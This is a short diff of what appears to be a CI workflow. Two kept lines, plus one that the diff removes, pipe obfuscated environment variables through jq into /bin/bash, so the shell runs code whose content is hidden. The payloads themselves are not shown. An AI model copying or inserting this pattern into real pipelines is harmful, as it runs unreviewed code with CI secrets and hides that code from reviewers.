@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$mvd1265" | jq -r .ymrt2090 | /bin/bash
           printf '%s' "$e11" | jq -r .oruum560 | /bin/bash
-          printf '%s' "$bu5" | jq -r .pev2 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
